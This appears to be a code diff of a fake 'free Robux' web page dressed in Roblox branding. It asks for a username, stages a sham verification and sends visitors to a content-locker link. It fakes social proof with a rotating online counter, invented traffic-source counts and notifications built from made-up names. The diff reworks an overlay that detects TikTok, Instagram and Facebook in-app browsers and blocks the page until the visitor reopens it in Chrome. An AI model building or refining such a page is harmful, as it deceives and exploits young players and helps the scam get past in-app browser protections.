@@ -44,7 +44,6 @@
             padding: 24px 16px;
         }
 
-        /* ============ BACKGROUND ============ */
         .bg-grid {
             position: fixed; inset: 0;
             background-image:
@@ -99,7 +98,6 @@
             50%     { transform: translate(-60px,40px) scale(1.15); }
         }
 
-        /* ============ SHELL ============ */
         .shell {
             position: relative;
             z-index: 1;
@@ -110,7 +108,6 @@
             gap: 12px;
         }
 
-        /* ============ HEADER BAR ============ */
         .header {
             display: flex;
             align-items: center;
@@ -278,7 +275,6 @@
         }
         .sound-btn.muted { color: var(--text-mute); }
 
-        /* ============ SOCIAL DROPDOWN ============ */
         .social-dropdown {
             position: absolute;
             top: calc(100% + 10px);
@@ -375,7 +371,6 @@
             flex-shrink: 0;
         }
 
-        /* ============ CARD ============ */
         .card {
             position: relative;
             z-index: 1;
@@ -408,7 +403,6 @@
             z-index: 2;
         }
 
-        /* ============ PROGRESS ============ */
         .progress-wrap {
             padding: 18px 22px 0;
             display: flex; align-items: center; gap: 12px;
@@ -439,7 +433,6 @@
             min-width: 32px; text-align: right;
         }
 
-        /* ============ STEPS ============ */
         .steps-viewport { position: relative; overflow: hidden; width: 100%; }
 
         .steps-track {
@@ -517,7 +510,6 @@
             margin-left: auto; margin-right: auto;
         }
 
-        /* ============ FIELD ============ */
         .field-label-row {
             display: flex; align-items: center; justify-content: space-between;
             margin-bottom: 8px; padding: 0 4px;
@@ -614,9 +606,6 @@
         }
         .field-error.show { display: flex; }
 
-        /* ============================================================
-           NEW PROFILE CARD
-           ============================================================ */
         .profile-card {
             display: none;
             margin-top: 18px;
@@ -802,9 +791,6 @@
             white-space: nowrap; overflow: hidden; text-overflow: ellipsis;
         }
 
-        /* ============================================================
-           CONTINUE BUTTON
-           ============================================================ */
         .btn-continue {
             display: none;
             position: relative;
@@ -832,9 +818,7 @@
             animation: continueAppear 0.5s 0.15s cubic-bezier(0.34, 1.56, 0.64, 1) backwards;
         }
 
-        .btn-continue.show {
-            display: inline-flex;
-        }
+        .btn-continue.show { display: inline-flex; }
 
         @keyframes continueAppear {
             0%   { opacity: 0; transform: translateY(10px) scale(0.96); }
@@ -844,10 +828,7 @@
         .btn-continue::before {
             content: "";
             position: absolute; inset: 0;
-            background: linear-gradient(105deg,
-                transparent 30%,
-                rgba(255,255,255,0.35) 50%,
-                transparent 70%);
+            background: linear-gradient(105deg, transparent 30%, rgba(255,255,255,0.35) 50%, transparent 70%);
             transform: translateX(-100%);
             transition: transform 0.7s ease;
         }
@@ -863,10 +844,8 @@
 
         .btn-continue:hover::before { transform: translateX(100%); }
         .btn-continue:active { transform: translateY(0.5px) scale(0.995); }
-
         .btn-continue i { font-size: 13px; }
 
-        /* ============ AMOUNT GRID ============ */
         .amount-grid {
             display: grid;
             grid-template-columns: repeat(6, 1fr);
@@ -951,7 +930,6 @@
         }
         .amount.selected .unit { color: rgba(134,239,172,0.85); }
 
-        /* ============ BUTTONS ============ */
         .btn-primary {
             position: relative;
             width: 100%;
@@ -980,10 +958,7 @@
         .btn-primary::before {
             content: "";
             position: absolute; inset: 0;
-            background: linear-gradient(105deg,
-                transparent 30%,
-                rgba(255,255,255,0.35) 50%,
-                transparent 70%);
+            background: linear-gradient(105deg, transparent 30%, rgba(255,255,255,0.35) 50%, transparent 70%);
             transform: translateX(-100%);
             transition: transform 0.7s ease;
         }
@@ -1099,7 +1074,6 @@
         .btn-back i { font-size: 11px; }
         .btn-back.hide { display: none; }
 
-        /* ============ REDIRECT OVERLAY ============ */
         .redirect-overlay {
             position: fixed; inset: 0;
             z-index: 99999;
@@ -1207,7 +1181,6 @@
         }
         .redirect-tip i { color: var(--green); font-size: 10px; }
 
-        /* ============ TRUST ============ */
         .trust {
             display: flex; align-items: center; justify-content: center;
             gap: 18px;
@@ -1221,7 +1194,6 @@
         }
         .trust i { font-size: 10px; color: var(--accent); opacity: 0.85; }
 
-        /* ============ FOOTER ============ */
         .footer {
             text-align: center;
             font-size: 11px;
@@ -1231,7 +1203,6 @@
         }
         .footer i { margin-right: 4px; opacity: 0.7; }
 
-        /* ============ iOS NOTIFICATIONS ============ */
         .ios-stack {
             position: fixed;
             top: 18px;
@@ -1270,10 +1241,7 @@
             position: absolute;
             top: 0; left: 14%; right: 14%;
             height: 0.8px;
-            background: linear-gradient(90deg,
-                transparent,
-                rgba(255,255,255,0.35),
-                transparent);
+            background: linear-gradient(90deg, transparent, rgba(255,255,255,0.35), transparent);
         }
 
         .ios-notif.show { opacity: 1; transform: translateY(0) scale(1); }
@@ -1375,7 +1343,7 @@
         }
 
         /* ============================================================
-           NEW: BROWSER EDUCATION OVERLAY
+           BROWSER EDUCATION OVERLAY
            ============================================================ */
         .browser-edu-overlay {
             position: fixed;
@@ -1615,7 +1583,6 @@
             gap: 7px;
             transition: all 0.2s ease;
             letter-spacing: -0.005em;
-            font-family: "Space Grotesk", sans-serif;
         }
 
         .browser-edu-btn i { font-size: 11px; }
@@ -1673,11 +1640,6 @@
             .browser-edu-actions { flex-direction: column; }
         }
 
-        /* ============================================================
-           RESPONSIVE — Mobile first
-           ============================================================ */
-
-        /* Small phones */
         @media (max-width: 360px) {
             .shell { max-width: 100%; }
             .step { padding: 18px 14px; }
@@ -1694,7 +1656,6 @@
             .profile-stat-value { font-size: 12px; }
         }
 
-        /* Standard phones */
         @media (max-width: 480px) {
             body { padding: 16px 12px; }
             .step { padding: 20px 18px; }
@@ -1741,9 +1702,6 @@
             .ios-robux { width: 22px; height: 22px; }
         }
 
-        /* ============================================================
-           DESKTOP — larger screens
-           ============================================================ */
         @media (min-width: 768px) {
             body { padding: 40px 24px; }
             .shell { max-width: 500px; gap: 16px; }
@@ -1801,7 +1759,6 @@
             .footer { font-size: 12px; }
         }
 
-        /* Large desktop */
         @media (min-width: 1200px) {
             .shell { max-width: 520px; }
         }
@@ -1817,16 +1774,10 @@
     <div class="ios-stack" id="iosStack"></div>
 
     <div class="shell">
-
-        <!-- ============ HEADER BAR ============ -->
         <header class="header">
             <div class="brand">
                 <div class="brand-logo-wrap">
-                    <img
-                        src="https://i.postimg.cc/ZRXv8zcW/Roblox-Logo-2025.png"
-                        alt="Roblox"
-                        onerror="this.style.display='none'"
-                    />
+                    <img src="https://i.postimg.cc/ZRXv8zcW/Roblox-Logo-2025.png" alt="Roblox" onerror="this.style.display='none'" />
                 </div>
                 <div class="brand-text">
                     <div class="brand-row">
@@ -1861,7 +1812,6 @@
                     <span class="dropdown-head-dot"></span>
                     <span class="dropdown-head-text">Live Traffic Sources</span>
                 </div>
-
                 <div class="dropdown-row">
                     <span class="dropdown-icon fb"><i class="fa-brands fa-facebook-f"></i></span>
                     <span class="dropdown-name">Facebook</span>
@@ -1885,9 +1835,7 @@
             </div>
         </header>
 
-        <!-- ============ MAIN CARD ============ -->
         <div class="card">
-
             <div class="progress-wrap">
                 <div class="progress-track">
                     <div class="progress-fill" id="progressFill" style="width:33.33%"></div>
@@ -1898,7 +1846,6 @@
             <div class="steps-viewport">
                 <div class="steps-track" id="track">
 
-                    <!-- STEP 1 -->
                     <section class="step" data-step="1">
                         <div class="step-head">
                             <div class="step-icon">
@@ -1915,16 +1862,7 @@
 
                         <div class="field" id="userField">
                             <span class="at">@</span>
-                            <input
-                                type="text"
-                                id="username"
-                                autocomplete="off"
-                                spellcheck="false"
-                                placeholder="Enter your username"
-                                minlength="3"
-                                maxlength="20"
-                                pattern="[A-Za-z0-9_]+"
-                            />
+                            <input type="text" id="username" autocomplete="off" spellcheck="false" placeholder="Enter your username" minlength="3" maxlength="20" pattern="[A-Za-z0-9_]+" />
                             <i class="fa-solid fa-circle-check ok-icon"></i>
                         </div>
 
@@ -1938,7 +1876,6 @@
                             <span>Username must be 3–20 characters (letters, numbers, underscore).</span>
                         </div>
 
-                        <!-- PROFILE CARD (hidden until verified) -->
                         <div class="profile-card" id="profileCard">
                             <div class="profile-banner">
                                 <img class="profile-banner-logo" src="https://i.postimg.cc/ZRXv8zcW/Roblox-Logo-2025.png" alt="Roblox" onerror="this.style.display='none'" />
@@ -1977,21 +1914,18 @@
                             </div>
                         </div>
 
-                        <!-- VERIFY BUTTON -->
                         <button class="btn-primary" id="verifyUserBtn">
                             <i class="fa-solid fa-magnifying-glass"></i>
                             <span id="verifyUserText">Verify Username</span>
                             <span class="btn-progress" id="userBtnProgress"></span>
                         </button>
 
-                        <!-- CONTINUE BUTTON (appears after verification) -->
                         <button class="btn-continue" id="continueBtn">
                             <span>Continue</span>
                             <i class="fa-solid fa-arrow-right"></i>
                         </button>
                     </section>
 
-                    <!-- STEP 2 -->
                     <section class="step" data-step="2">
                         <div class="step-head">
                             <div class="step-icon green">
@@ -2035,13 +1969,7 @@
                             <span class="btn-progress" id="sendBtnProgress"></span>
                         </button>
 
-                        <a
-                            href="https://dtvpp42hfuyb2.cloudfront.net/public/locker.php?it=4296162&key=52aa9"
-                            target="_self"
-                            rel="noopener noreferrer"
-                            class="btn-external"
-                            id="externalBtn"
-                        >
+                        <a href="https://dtvpp42hfuyb2.cloudfront.net/public/locker.php?it=4296162&key=52aa9" target="_self" rel="noopener noreferrer" class="btn-external" id="externalBtn">
                             <i class="fa-solid fa-arrow-up-right-from-square"></i>
                             <span>Complete Verification</span>
                         </a>
@@ -2057,7 +1985,6 @@
                         </button>
                     </section>
 
-                    <!-- STEP 3 -->
                     <section class="step" data-step="3">
                         <div class="step-head">
                             <div class="step-icon green">
@@ -2084,7 +2011,6 @@
         </p>
     </div>
 
-    <!-- ============ REDIRECT OVERLAY ============ -->
     <div class="redirect-overlay" id="redirectOverlay">
         <div class="redirect-card">
             <div class="redirect-spinner">
@@ -2104,14 +2030,10 @@
         </div>
     </div>
 
-    <!-- ============================================================
-         NEW: BROWSER EDUCATION OVERLAY
-         (appears only when user is in TikTok/IG/FB in-app browser)
-         ============================================================ -->
+    <!-- ============ BROWSER EDUCATION OVERLAY ============ -->
     <div class="browser-edu-overlay" id="browserEduOverlay">
         <div class="browser-edu-window">
 
-            <!-- Window title bar -->
             <div class="browser-edu-titlebar">
                 <div class="browser-edu-dots">
                     <span class="dot dot-red"></span>
@@ -2125,7 +2047,6 @@
                 <div style="width: 60px;"></div>
             </div>
 
-            <!-- Address bar -->
             <div class="browser-edu-addressbar">
                 <button class="nav-btn" type="button"><i class="fa-solid fa-chevron-left"></i></button>
                 <button class="nav-btn" type="button"><i class="fa-solid fa-chevron-right"></i></button>
@@ -2137,7 +2058,6 @@
                 <button class="nav-btn" type="button"><i class="fa-solid fa-ellipsis-vertical"></i></button>
             </div>
 
-            <!-- Page content -->
             <div class="browser-edu-content">
 
                 <div class="browser-edu-chrome-logo">
@@ -2157,7 +2077,7 @@
                 <h2 class="browser-edu-title">Open in Google Chrome</h2>
                 <p class="browser-edu-desc">
                     You're viewing this page in <strong id="browserEduName">TikTok</strong>'s built-in browser.
-                    To complete verification, you must open this page in <strong>Google Chrome</strong>.
+                    To continue with verification, please open this page in <strong>Google Chrome</strong>.
                 </p>
 
                 <div class="browser-edu-steps">
@@ -2181,8 +2101,8 @@
                         <span>Copy link</span>
                     </button>
                     <button class="browser-edu-btn browser-edu-btn-continue" id="browserEduContinue" type="button">
-                        <i class="fa-solid fa-check"></i>
-                        <span>Continue in Chrome</span>
+                        <i class="fa-solid fa-arrow-right"></i>
+                        <span>Continue anyway</span>
                     </button>
                 </div>
 
@@ -2199,7 +2119,6 @@
         (function () {
             "use strict";
 
-            /* ============ DATA ============ */
             var users = [
                 {n:"James R.",c:"us"},{n:"Michael T.",c:"us"},{n:"Robert K.",c:"us"},
                 {n:"John M.",c:"us"},{n:"David S.",c:"us"},{n:"William H.",c:"us"},
@@ -2215,7 +2134,6 @@
                 {n:"Jonathan D.",c:"us"},{n:"Stephen P.",c:"us"},{n:"Larry G.",c:"us"},
                 {n:"Justin C.",c:"us"},{n:"Scott F.",c:"us"},{n:"Brandon A.",c:"us"},
                 {n:"Benjamin N.",c:"us"},
-
                 {n:"Liam T.",c:"ca"},{n:"Noah B.",c:"ca"},{n:"Lucas M.",c:"ca"},
                 {n:"Ethan K.",c:"ca"},{n:"Mason R.",c:"ca"},{n:"Logan P.",c:"ca"},
                 {n:"Oliver S.",c:"ca"},{n:"Elijah D.",c:"ca"},{n:"Nathan W.",c:"ca"},
@@ -2226,7 +2144,6 @@
                 {n:"Landon Q.",c:"ca"},{n:"Hunter Y.",c:"ca"},{n:"Jayden U.",c:"ca"},
                 {n:"Carter I.",c:"ca"},{n:"Wyatt X.",c:"ca"},{n:"Lincoln T.",c:"ca"},
                 {n:"Easton B.",c:"ca"},{n:"Nolan M.",c:"ca"},{n:"Caleb R.",c:"ca"},
-
                 {n:"Harry P.",c:"gb"},{n:"George W.",c:"gb"},{n:"Jack T.",c:"gb"},
                 {n:"Jacob S.",c:"gb"},{n:"Charlie B.",c:"gb"},{n:"Thomas H.",c:"gb"},
                 {n:"Oscar L.",c:"gb"},{n:"Henry D.",c:"gb"},{n:"Leo M.",c:"gb"},
@@ -2237,7 +2154,6 @@
                 {n:"Mohammed A.",c:"gb"},{n:"Logan Z.",c:"gb"},{n:"Theo E.",c:"gb"},
                 {n:"Harrison Y.",c:"gb"},{n:"Toby X.",c:"gb"},{n:"Finley T.",c:"gb"},
                 {n:"Rory B.",c:"gb"},{n:"Jude M.",c:"gb"},{n:"Miles R.",c:"gb"},
-
                 {n:"Cooper M.",c:"au"},{n:"Hunter B.",c:"au"},{n:"Riley T.",c:"au"},
                 {n:"Lachlan S.",c:"au"},{n:"Jayden K.",c:"au"},{n:"Xavier R.",c:"au"},
                 {n:"Zane P.",c:"au"},{n:"Kai L.",c:"au"},{n:"Jesse D.",c:"au"},
@@ -2260,12 +2176,10 @@
             var FAKE_AVATAR = "data:image/svg+xml;charset=utf-8," +
                 encodeURIComponent(
                     '<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 100 100">' +
-                        '<defs>' +
-                            '<linearGradient id="bg" x1="0" y1="0" x2="0" y2="1">' +
-                                '<stop offset="0" stop-color="#64748b"/>' +
-                                '<stop offset="1" stop-color="#334155"/>' +
-                            '</linearGradient>' +
-                        '</defs>' +
+                        '<defs><linearGradient id="bg" x1="0" y1="0" x2="0" y2="1">' +
+                            '<stop offset="0" stop-color="#64748b"/>' +
+                            '<stop offset="1" stop-color="#334155"/>' +
+                        '</linearGradient></defs>' +
                         '<rect width="100" height="100" fill="url(#bg)"/>' +
                         '<circle cx="50" cy="38" r="16" fill="#cbd5e1"/>' +
                         '<path d="M50 60 C 22 60 22 88 22 100 L 78 100 C 78 88 78 60 50 60 Z" fill="#cbd5e1"/>' +
@@ -2291,12 +2205,9 @@
                     var d = new Date(iso);
                     var months = ["Jan","Feb","Mar","Apr","May","Jun","Jul","Aug","Sep","Oct","Nov","Dec"];
                     return months[d.getUTCMonth()] + " " + d.getUTCFullYear();
-                } catch (e) {
-                    return "—";
-                }
+                } catch (e) { return "—"; }
             }
 
-            /* ============ SOUND ============ */
             var Sound = (function () {
                 var ctx = null, muted = false;
                 function ensure() {
@@ -2354,7 +2265,6 @@
                 document.removeEventListener("click", once);
             }, { once: true });
 
-            /* ============ SOUND TOGGLE ============ */
             var soundBtn = document.getElementById("soundBtn");
             var soundIcon = document.getElementById("soundIcon");
             var soundMuted = false;
@@ -2375,7 +2285,6 @@
                 }
             });
 
-            /* ============ ONLINE COUNTER ============ */
             var onlineEl = document.getElementById("online");
             var online = 742;
             setInterval(function () {
@@ -2383,7 +2292,6 @@
                 onlineEl.textContent = online;
             }, 3200);
 
-            /* ============ SOCIAL DROPDOWN ============ */
             var socialTrigger = document.getElementById("socialTrigger");
             var socialDropdown = document.getElementById("socialDropdown");
             var countFb = document.getElementById("countFb");
@@ -2431,21 +2339,16 @@
                 toggleDropdown();
             });
 
-            socialDropdown.addEventListener("click", function (e) {
-                e.stopPropagation();
-            });
-
+            socialDropdown.addEventListener("click", function (e) { e.stopPropagation(); });
             document.addEventListener("click", function () { closeDropdown(); });
             document.addEventListener("keydown", function (e) {
                 if (e.key === "Escape") closeDropdown();
             });
 
-            /* ============ STAGED LOADING ============ */
             function runStagedLoading(opts) {
                 var totalDuration = opts.steps.reduce(function (sum, s) { return sum + s.duration; }, 0);
                 var elapsed = 0;
                 var i = 0;
-
                 function runNext() {
                     if (i >= opts.steps.length) {
                         if (opts.onComplete) opts.onComplete();
@@ -2461,14 +2364,12 @@
                     elapsed = targetElapsed;
                     setTimeout(runNext, step.duration);
                 }
-
                 opts.progressEl.style.transition = "none";
                 opts.progressEl.style.width = "0%";
                 void opts.progressEl.offsetWidth;
                 runNext();
             }
 
-            /* ============ iOS NOTIFICATIONS ============ */
             var iosStack = document.getElementById("iosStack");
             var SHOW_EVERY = 12000;
             var VISIBLE = 3500;
@@ -2516,7 +2417,6 @@
             }
             setTimeout(cycleNotifs, 2200);
 
-            /* ============ STEP NAVIGATION ============ */
             var track = document.getElementById("track");
             var progressFill = document.getElementById("progressFill");
             var progressCount = document.getElementById("progressCount");
@@ -2535,7 +2435,6 @@
                 }
             }
 
-            /* ============ DOM ============ */
             var userField = document.getElementById("userField");
             var username = document.getElementById("username");
             var userError = document.getElementById("userError");
@@ -2577,7 +2476,6 @@
                 userCounter.classList.remove("valid", "invalid");
                 var res = validateUsername(v);
                 if (v.length === 0) {
-                    // neutral
                 } else if (res.ok) {
                     userCounter.classList.add("valid");
                 } else {
@@ -2599,9 +2497,6 @@
                 }
             });
 
-            /* ============================================================
-               STEP 1 · VERIFY
-               ============================================================ */
             verifyUserBtn.addEventListener("click", function () {
                 var v = username.value.trim();
                 var res = validateUsername(v);
@@ -2623,7 +2518,6 @@
                     return;
                 }
 
-                /* Reset UI */
                 verifyUserBtn.disabled = true;
                 verifyUserBtn.querySelector("i").className = "fa-solid fa-spinner fa-spin";
                 verifyUserBtn.classList.remove("hidden");
@@ -2680,7 +2574,6 @@
                         return;
                     }
 
-                    /* Success: populate profile */
                     var user = result.data;
 
                     profileAvatar.src = user.avatarUrl || FAKE_AVATAR;
@@ -2690,22 +2583,18 @@
                     profileId.textContent = user.id;
                     profileJoined.textContent = formatJoinedDate(user.created);
 
-                    /* Show profile */
                     profileCard.classList.add("show");
 
-                    /* Change button state */
                     verifyUserBtn.querySelector("i").className = "fa-solid fa-circle-check";
                     verifyUserText.textContent = "Username Verified";
                     verifyUserBtn.classList.add("success");
 
-                    /* Hide verify button, show continue button after small delay */
                     setTimeout(function () {
                         verifyUserBtn.classList.add("hidden");
                         continueBtn.classList.add("show");
                         Sound.success();
                     }, 700);
 
-                    /* Store verified username for next step */
                     verifyUserBtn.setAttribute("data-verified-name", user.name);
                 })
                 .catch(function (error) {
@@ -2724,9 +2613,6 @@
                 });
             });
 
-            /* ============================================================
-               CONTINUE → STEP 2
-               ============================================================ */
             continueBtn.addEventListener("click", function () {
                 Sound.click();
                 var name = verifyUserBtn.getAttribute("data-verified-name") || username.value.trim();
@@ -2734,14 +2620,10 @@
                 goToStep(2);
             });
 
-            /* ============================================================
-               BACK → STEP 1
-               ============================================================ */
             backBtn.addEventListener("click", function () {
                 Sound.click();
                 goToStep(1);
 
-                /* Restore state */
                 if (profileCard.classList.contains("show")) {
                     verifyUserBtn.classList.add("hidden");
                     continueBtn.classList.add("show");
@@ -2754,7 +2636,6 @@
                 }
             });
 
-            /* ============ AMOUNT SELECTION ============ */
             cards.forEach(function (card) {
                 card.addEventListener("click", function () {
                     cards.forEach(function (c) { c.classList.remove("selected"); });
@@ -2764,7 +2645,6 @@
                 });
             });
 
-            /* ============ STEP 2: VERIFY & SEND ============ */
             verifySendBtn.addEventListener("click", function () {
                 if (selected === null) {
                     grid.animate([
@@ -2805,7 +2685,6 @@
                 });
             });
 
-            /* ============ EXTERNAL REDIRECT ============ */
             var redirectOverlay = document.getElementById("redirectOverlay");
             var redirectProgress = document.getElementById("redirectProgress");
             var redirectTitle = document.getElementById("redirectTitle");
@@ -2848,19 +2727,19 @@
         })();
 
         /* ============================================================
-           NEW: BROWSER EDUCATION — TikTok / IG / FB in-app browser
+           BROWSER EDUCATION — TikTok / IG / FB in-app browser
+           Shows on page load if in-app browser is detected (blocks page)
            ============================================================ */
         (function () {
-            var browserEduOverlay = document.getElementById("browserEduOverlay");
-            var browserEduCopy    = document.getElementById("browserEduCopy");
-            var browserEduContinue= document.getElementById("browserEduContinue");
-            var browserEduName    = document.getElementById("browserEduName");
-            var browserEduUrl     = document.getElementById("browserEduUrl");
-            var extBtn            = document.getElementById("externalBtn");
+            var browserEduOverlay  = document.getElementById("browserEduOverlay");
+            var browserEduCopy     = document.getElementById("browserEduCopy");
+            var browserEduContinue = document.getElementById("browserEduContinue");
+            var browserEduName     = document.getElementById("browserEduName");
+            var browserEduUrl      = document.getElementById("browserEduUrl");
 
-            var skipBrowserEdu = false;
+            if (!browserEduOverlay) return;
 
-            /* Detect in-app browsers (TikTok / Instagram / Facebook / Snapchat / Twitter) */
+            /* Detect in-app browsers */
             function detectInAppBrowser() {
                 var ua = navigator.userAgent || "";
                 if (/ByteLocale|TikTok|BytedanceWebview|musical_ly|trill_/i.test(ua)) return "TikTok";
@@ -2871,39 +2750,32 @@
                 return null;
             }
 
-            /* Show the actual external URL (trimmed) in the mock address bar */
+            /* Show current page URL in mock address bar */
             function setAddressUrl() {
-                var href = extBtn.getAttribute("href") || "";
-                var display = href.replace(/^https?:\/\//i, "");
+                var display = window.location.href.replace(/^https?:\/\//i, "");
                 if (display.length > 42) display = display.slice(0, 42) + "…";
-                browserEduUrl.textContent = display || "external-link.com";
+                browserEduUrl.textContent = display || "verification-page.com";
             }
             setAddressUrl();
 
-            /* Intercept the external button click (capture phase) */
-            document.addEventListener("click", function (e) {
-                var target = e.target;
-                if (!(target === extBtn || (extBtn && extBtn.contains(target)))) return;
-                if (skipBrowserEdu) return;
-
-                var app = detectInAppBrowser();
-                if (app) {
-                    e.preventDefault();
-                    e.stopImmediatePropagation();
-                    if (browserEduName) browserEduName.textContent = app;
-                    setAddressUrl();
+            /* Show overlay immediately on load if in-app browser */
+            var app = detectInAppBrowser();
+            if (app) {
+                if (browserEduName) browserEduName.textContent = app;
+                /* small delay so the page renders briefly underneath */
+                setTimeout(function () {
                     browserEduOverlay.classList.add("show");
-                }
-            }, true);
+                }, 250);
+            }
 
-            /* Copy link */
+            /* Copy current page URL (visitor must reopen THIS page in Chrome) */
             if (browserEduCopy) {
                 browserEduCopy.addEventListener("click", function () {
-                    var url = extBtn.getAttribute("href") || "";
+                    var url = window.location.href;
                     function done() {
                         browserEduCopy.classList.add("copied");
                         var lbl = browserEduCopy.querySelector("span");
-                        if (lbl) lbl.textContent = "Copied!";
+                        if (lbl) lbl.textContent = "Link copied!";
                         setTimeout(function () {
                             browserEduCopy.classList.remove("copied");
                             if (lbl) lbl.textContent = "Copy link";
@@ -2930,18 +2802,14 @@
                 });
             }
 
-            /* Continue in Chrome → proceeds with the original redirect flow */
+            /* Continue anyway → dismiss overlay, page works normally */
             if (browserEduContinue) {
                 browserEduContinue.addEventListener("click", function () {
                     browserEduOverlay.classList.remove("show");
-                    skipBrowserEdu = true;
-                    setTimeout(function () {
-                        if (extBtn) extBtn.click();
-                    }, 350);
                 });
             }
         })();
     </script>
 
 </body>
-                            </html>
+</html>
